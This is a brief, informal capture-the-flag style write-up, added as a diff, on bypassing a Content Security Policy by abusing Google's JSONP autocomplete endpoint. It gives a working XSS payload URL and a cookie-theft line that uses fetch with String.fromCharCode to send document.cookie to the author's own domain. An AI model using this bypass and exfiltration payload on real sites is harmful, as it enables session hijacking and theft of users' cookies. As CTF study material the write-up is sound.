@@ -1,0 +1,14 @@
+CSP : default-src 'self'; script-src 'self' *.google.com; connect-src *
+
+Instantly knew, that this is JSONP abusing. I think I prolly did something with this in plaidctf or dc quals - i can't recall.
+
+anyways, 
+
+https://www.google.com/complete/search?client=chrome&jsonp=eval(alert(1337));
+
+Defeated it at 278 bytes using https://eve.gd/2007/05/23/string-fromcharcode-encoder/ , my domain is bigass otherwise could be done is lesser
+
+Used
+
+fetch(String.fromCharCode(domain_in_decimal_csv)+document.cookie)
+encode and shilled
